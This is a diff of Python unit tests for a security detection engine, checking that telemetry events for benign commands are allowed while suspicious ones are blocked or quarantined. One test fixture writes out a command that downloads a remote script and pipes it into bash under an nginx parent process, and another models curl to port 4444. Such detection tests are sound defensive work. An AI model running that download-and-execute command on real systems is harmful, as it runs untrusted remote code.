@@ -1,16 +1,57 @@
+from app.detector import RiskEngine
 from app.models import TelemetryEvent
-from app.detector import AnomalyDetector
 from app.policy import PolicyEngine
 
+
 def event(**kw):
-    base=dict(event_id="e1", event_type="network", destination_port=443, bytes_out=1000)
-    base.update(kw); return TelemetryEvent(**base)
+    base = dict(
+        event_id="e1",
+        event_type="process",
+        tetragon_event_type="process_exec",
+        binary="/usr/bin/ls",
+        args="-la /tmp",
+        uid=0,
+        cluster_name="security-demo",
+        namespace="default",
+        pod_name="security-demo",
+    )
+    base.update(kw)
+    return TelemetryEvent(**base)
+
+
+def test_ls_as_root_stays_low_allow():
+    e = event()
+    risk, factors, reasons = RiskEngine().score(e)
+    d = PolicyEngine().decide(e, risk)
+    assert risk <= 0.10
+    assert d.severity == "low"
+    assert d.action == "allow"
+
 
 def test_known_ioc_becomes_critical_block():
-    e=event(known_bad_ioc=True, privileged=True, failed_auth_count=8, destination_port=4444)
-    risk,_=AnomalyDetector().score(e); d=PolicyEngine().decide(e,risk)
-    assert risk >= .95 and d.severity == "critical" and d.action == "block" and d.approval_required
+    e = event(
+        event_type="kernel",
+        tetragon_event_type="process_kprobe",
+        binary="/usr/bin/curl",
+        destination_ip="8.8.8.8",
+        destination_port=4444,
+        known_bad_ioc=True,
+    )
+    risk, factors, reasons = RiskEngine().score(e)
+    d = PolicyEngine().decide(e, risk)
+    assert risk >= 0.90
+    assert d.severity == "critical"
+    assert d.action == "block"
+    assert d.approval_required
 
-def test_normal_event_is_not_blocked():
-    e=event(); risk,_=AnomalyDetector().score(e); d=PolicyEngine().decide(e,risk)
-    assert d.action in {"allow","alert"}
+
+def test_download_to_shell_is_escalated():
+    e = event(
+        binary="/bin/bash",
+        args="-c 'curl http://example.invalid/a.sh | bash'",
+        parent_binary="/usr/sbin/nginx",
+    )
+    risk, factors, reasons = RiskEngine().score(e)
+    d = PolicyEngine().decide(e, risk)
+    assert risk >= 0.65
+    assert d.action in {"quarantine", "block"}
